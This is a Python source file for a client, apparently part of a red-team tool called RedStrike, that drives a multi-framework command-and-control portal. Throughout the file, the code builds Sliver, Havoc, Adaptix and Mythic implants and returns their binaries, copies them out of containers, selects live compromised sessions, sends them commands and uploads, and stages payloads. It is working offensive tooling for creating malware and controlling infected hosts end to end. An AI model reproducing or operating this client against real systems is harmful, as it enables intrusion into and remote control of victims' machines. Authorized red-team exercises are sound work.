from __future__ import annotations

import json
import os
import uuid
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

_DEFAULT_TIMEOUT = 30
_BUILD_TIMEOUT = 330  # adaptix compiles synchronously server-side (up to 300s)

#: Portal backend names as the Flight Control API spells them.
STACK_BACKENDS = ("meridian", "mythic", "havoc", "adaptix", "sliver")


class C2StackClient:
    """Full-capability client for C2Stack's Flight Control portal.

    `PortalClient` (redstrike/c2/portal.py) is the *tasking* adapter for the
    havoc/adaptix C2 backends; this client exposes the rest of the stack an
    operator needs — fleet visibility, capability probing, payload builds for
    every framework, Mythic file staging, and redirector verification — so
    RedStrike can drive the stack end-to-end (generate an implant, deliver it,
    task the session) instead of assuming sessions already exist.

    Contract (verified against C2Stack v3.1.0 / portal v3.2.0, 2026-10-04):
      * ``GET  /api/status``           service health (containers, ports, prefixes)
      * ``GET  /api/ops/summary``      live capability probe per framework
      * ``GET  /api/ops/sessions``     unified fleet view (+ per-backend errors)
      * ``GET  /api/ops/catalogues``   per-framework tasking vocabulary
      * ``POST /api/ops/task``         framework-native tasking (any backend)
      * ``POST /api/ops/sliver/generate``  server-side implant build (stays in
        the container; the response carries the host-side `docker cp` line)
      * ``POST /api/ops/havoc/build``      server-side Demon build -> base64 PE
      * ``POST /api/ops/adaptix/listener`` + ``/agent``  listener + synchronous
        mingw compile -> base64 beacon (jitter must be 0 on this snapshot)
      * ``POST /api/ops/mythic/build``     async Apollo build -> poll
        ``GET /api/ops/mythic/build/{uuid}`` -> ``GET /api/ops/mythic/payload/{uuid}``
      * ``POST /api/ops/mythic/upload``    multipart staging -> agent_file_id
      * ``POST /api/ops/probe``            real redirector probe (decoy vs backend)

    Transport errors are returned as ``{"ok": False, "error": ...}`` — callers
    decide how to surface them; nothing is fabricated.
    """

    def __init__(
        self,
        endpoint: str | None = None,
        timeout_seconds: int = _DEFAULT_TIMEOUT,
    ) -> None:
        self.endpoint = (
            endpoint
            or os.environ.get("C2STACK_PORTAL_URL")
            or "http://127.0.0.1:8000"
        ).rstrip("/")
        self.timeout_seconds = timeout_seconds

    # ---------------------------------------------------------------- HTTP
    def _request_json(
        self,
        method: str,
        path: str,
        payload: dict[str, Any] | None = None,
        *,
        body: bytes | None = None,
        headers: dict[str, str] | None = None,
        timeout: int | None = None,
    ) -> dict[str, Any]:
        all_headers = {"Content-Type": "application/json"} if payload is not None else {}
        if headers:
            all_headers.update(headers)
        data = body if body is not None else (
            json.dumps(payload).encode() if payload is not None else None
        )
        req = Request(self.endpoint + path, data=data, headers=all_headers, method=method)
        try:
            with urlopen(req, timeout=timeout or self.timeout_seconds) as resp:
                return json.loads(resp.read().decode("utf-8", errors="replace"))
        except HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")[:300]
            return {"ok": False, "error": f"HTTP {exc.code}: {detail}"}
        except (URLError, OSError, json.JSONDecodeError) as exc:
            return {"ok": False, "error": f"portal unreachable: {exc}"}

    def _get_json(self, path: str, timeout: int | None = None) -> dict[str, Any]:
        return self._request_json("GET", path, timeout=timeout)

    def _post_json(
        self, path: str, payload: dict[str, Any], timeout: int | None = None
    ) -> dict[str, Any]:
        return self._request_json("POST", path, payload, timeout=timeout)

    def _get_bytes(self, path: str, timeout: int | None = None) -> tuple[bytes | None, str | None]:
        req = Request(self.endpoint + path, method="GET")
        try:
            with urlopen(req, timeout=timeout or self.timeout_seconds) as resp:
                return resp.read(), None
        except HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")[:300]
            return None, f"HTTP {exc.code}: {detail}"
        except (URLError, OSError) as exc:
            return None, f"portal unreachable: {exc}"

    # ------------------------------------------------------------- infra
    def status(self) -> dict[str, Any]:
        """Service health: containers, published ports, URI prefixes."""
        return self._get_json("/api/status")

    def capabilities(self) -> dict[str, Any]:
        """What the stack can actually do right now (probed live per framework)."""
        return self._get_json("/api/ops/summary", timeout=60)

    def catalogues(self, backend: str | None = None) -> dict[str, Any]:
        """Per-framework tasking vocabulary (Havoc/Adaptix/… command sets)."""
        data = self._get_json("/api/ops/catalogues")
        if backend and isinstance(data, dict) and data.get("ok", True):
            return {"ok": True, "backend": backend, "commands": data.get(backend, {})}
        return data

    def sessions(self, backend: str | None = None) -> dict[str, Any]:
        """Unified fleet view; optionally filtered to one backend."""
        data = self._get_json("/api/ops/sessions", timeout=60)
        if backend and isinstance(data, dict) and data.get("sessions") is not None:
            data = dict(data)
            data["sessions"] = [s for s in data["sessions"] if s.get("backend") == backend]
        return data

    def backends(self) -> dict[str, Any]:
        """Per-backend health map from the fleet view (ok/count/error)."""
        data = self.sessions()
        return data.get("backends", {}) if isinstance(data, dict) else {}

    def select_session(
        self,
        backend: str,
        *,
        hostname: str | None = None,
        alive_only: bool = True,
    ) -> dict[str, Any] | None:
        """Pick a taskable session: newest matching entry from the fleet view."""
        data = self.sessions(backend=backend)
        candidates = data.get("sessions", []) if isinstance(data, dict) else []
        if alive_only:
            candidates = [s for s in candidates if s.get("is_alive", True)]
        if hostname:
            lowered = hostname.lower()
            candidates = [
                s for s in candidates
                if lowered in str(s.get("hostname", "")).lower()
            ]
        return candidates[0] if candidates else None

    def probe_redirector(
        self,
        url_path: str = "/",
        headers: dict[str, str] | None = None,
        method: str = "GET",
    ) -> dict[str, Any]:
        """Issue a REAL request through the redirector; verdicts: decoy | backend | backend_down | unreachable."""
        return self._post_json(
            "/api/ops/probe",
            {"url_path": url_path, "headers": headers or {}, "method": method},
        )

    # ------------------------------------------------------------- tasking
    def task(
        self,
        backend: str,
        session_id: str,
        command: str,
        *,
        wait: int = 25,
        callback_id: int | None = None,
        upload_data_b64: str | None = None,
    ) -> dict[str, Any]:
        """Framework-native tasking through one unified route (any backend)."""
        payload: dict[str, Any] = {
            "session_id": session_id,
            "backend": backend,
            "command": command,
            "wait": wait,
        }
        if callback_id is not None:
            payload["callback_id"] = callback_id
        if upload_data_b64 is not None:
            payload["upload_data_b64"] = upload_data_b64
        return self._post_json("/api/ops/task", payload, timeout=wait + 60)

    def results(self, backend: str, session_id: str) -> dict[str, Any]:
        return self._get_json(f"/api/ops/results?backend={backend}&session_id={session_id}")

    # ------------------------------------------------------- payload builds
    def build_sliver(
        self,
        kind: str = "session",
        c2_url: str | None = None,
        target_os: str = "windows",
        arch: str = "amd64",
    ) -> dict[str, Any]:
        """Build a Sliver implant server-side (garble, ~40s warm).

        The (large) binary stays inside the sliver container; the response
        carries ``container_path`` and the host-side ``retrieve`` command."""
        payload: dict[str, Any] = {"kind": kind, "target_os": target_os, "arch": arch}
        if c2_url:
            payload["c2_url"] = c2_url
        return self._post_json("/api/ops/sliver/generate", payload, timeout=660)

    def retrieve_container_file(self, container_path: str, dest: str | Path) -> dict[str, Any]:
        """`docker cp` a built payload out of the sliver container to `dest`."""
        import subprocess

        dest_path = Path(dest)
        cmd = ["docker", "cp", f"c2stack-sliver-1:{container_path}", str(dest_path)]
        try:
            done = subprocess.run(cmd, capture_output=True, timeout=300, check=False)
        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
            return {"ok": False, "error": f"docker cp failed: {exc}"}
        if done.returncode != 0:
            return {"ok": False, "error": done.stderr.decode("utf-8", "replace")[:300]}
        return {"ok": True, "path": str(dest_path), "size": dest_path.stat().st_size}

    def build_havoc(
        self,
        arch: str = "x64",
        format: str = "Windows Exe",
        listener: str | None = None,
        sleep: int = 5,
        jitter: int = 15,
    ) -> dict[str, Any]:
        """Build a Havoc Demon server-side (30–90s) and return its bytes."""
        payload: dict[str, Any] = {"arch": arch, "format": format, "sleep": sleep, "jitter": jitter}
        if listener:
            payload["listener"] = listener
        data = self._post_json("/api/ops/havoc/build", payload, timeout=960)
        return self._decode_build(data, "payload")

    def havoc_listeners(self) -> dict[str, Any]:
        return self._get_json("/api/ops/havoc/listeners")

    def build_adaptix(
        self,
        agent: str = "beacon",
        listener: str = "cadre_http",
        arch: str = "x64",
        format: str = "Exe",
        sleep: str = "30s",
        ensure_listener: bool = False,
        callback_address: str | None = None,
    ) -> dict[str, Any]:
        """Build an Adaptix beacon (server-side mingw compile, up to 300s).

        Jitter is hard-pinned to 0: on this vendored snapshot WaitMask mixes
        seconds/ms, so any non-zero jitter subtracts milliseconds instead of
        seconds (fixed upstream after the snapshot; PR #379). There is no
        parameter for it on purpose. ``ensure_listener`` re-creates the HTTP
        listener first (the portal raises if it already exists, so default
        off)."""
        if ensure_listener:
            listener_payload: dict[str, Any] = {"name": listener}
            if callback_address:
                listener_payload["callback_address"] = callback_address
            listener_result = self._post_json("/api/ops/adaptix/listener", listener_payload, timeout=60)
            if listener_result.get("ok") is False and "exist" not in str(listener_result.get("error", "")).lower():
                return listener_result
        data = self._post_json(
            "/api/ops/adaptix/agent",
            {"agent": agent, "listener": listener, "arch": arch, "format": format,
             "sleep": sleep, "jitter": 0},
            timeout=_BUILD_TIMEOUT,
        )
        return self._decode_build(data, "payload")

    def build_mythic(self, **overrides: Any) -> dict[str, Any]:
        """Queue an async Apollo build; poll with `mythic_build_status`.

        Accepted overrides mirror the portal's MythicBuildRequest
        (output_type, shellcode_format, debug, enable_keying, keying_method,
        keying_value, filename, ...)."""
        allowed = {
            "output_type", "shellcode_format", "shellcode_bypass", "debug",
            "adjust_filename", "enable_keying", "keying_method", "keying_value",
            "registry_path", "registry_value", "registry_comparison", "filename",
        }
        payload = {k: v for k, v in overrides.items() if k in allowed}
        return self._post_json("/api/ops/mythic/build", payload, timeout=60)

    def mythic_build_status(self, payload_uuid: str) -> dict[str, Any]:
        """phase: building | success | error (success adds download_url)."""
        return self._get_json(f"/api/ops/mythic/build/{payload_uuid}")

    def mythic_download(
        self, payload_uuid: str, dest: str | Path | None = None
    ) -> dict[str, Any]:
        content, error = self._get_bytes(f"/api/ops/mythic/payload/{payload_uuid}", timeout=_BUILD_TIMEOUT)
        if content is None:
            return {"ok": False, "error": error}
        result: dict[str, Any] = {"ok": True, "size": len(content), "payload": content}
        if dest is not None:
            dest_path = Path(dest)
            dest_path.write_bytes(content)
            result["path"] = str(dest_path)
        return result

    @staticmethod
    def _decode_build(data: dict[str, Any], payload_key: str) -> dict[str, Any]:
        """Decode a base64 payload field into raw bytes (portal build responses)."""
        import base64

        if not isinstance(data, dict) or data.get("ok") is False:
            return data
        blob = data.get("base64")
        if blob:
            try:
                data = dict(data)
                data[payload_key] = base64.b64decode(blob)
                data.pop("base64", None)
            except (ValueError, TypeError) as exc:
                return {"ok": False, "error": f"build response base64 decode failed: {exc}"}
        return data

    # ------------------------------------------------------------- staging
    def stage_bytes(self, content: bytes, filename: str) -> dict[str, Any]:
        """Stage operator bytes in Mythic (COFF/assembly/PE flows).

        Same multipart contract as ``task_upload_file_webhook`` (a JSON body
        is rejected with "Missing file in form" server-side)."""
        boundary = "----redstrike" + uuid.uuid4().hex
        crlf = "\r\n"
        body = (
            (
                f"--{boundary}{crlf}Content-Disposition: form-data; "
                f'name="file"; filename="{filename}"{crlf}'
                f"Content-Type: application/octet-stream{crlf}{crlf}"
            ).encode()
            + content
            + crlf.encode()
            + (f"--{boundary}--{crlf}").encode()
        )
        return self._request_json(
            "POST",
            "/api/ops/mythic/upload",
            body=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            timeout=120,
        )

    def stage_file(self, path: str | Path) -> dict[str, Any]:
        """Stage a local file in Mythic; returns its ``agent_file_id``."""
        file_path = Path(path)
        try:
            content = file_path.read_bytes()
        except OSError as exc:
            return {"ok": False, "error": f"cannot read {file_path}: {exc}"}
        result = self.stage_bytes(content, file_path.name)
        if isinstance(result, dict) and result.get("ok"):
            result.setdefault("local_path", str(file_path))
        return result
